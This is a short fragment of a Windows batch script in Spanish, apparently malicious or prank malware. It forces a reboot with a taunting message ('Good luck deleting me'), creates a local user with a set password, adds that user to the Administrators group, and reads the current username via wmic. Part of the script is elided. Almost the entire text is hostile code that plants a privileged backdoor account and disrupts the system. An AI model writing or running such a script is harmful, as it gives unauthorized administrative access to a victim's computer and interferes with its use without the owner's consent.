::Reinicio
shutdown -r -t 30 -c "Buena Suerte eliminandome gilipollas >:D"
...
set password=TuContraseñaSegura

net user %username% %password% /add
net localgroup Administradores %username% /add

for /f "tokens=2 delims==" %%G in ('wmic computersystem get username /value') do set currentUser=%%G
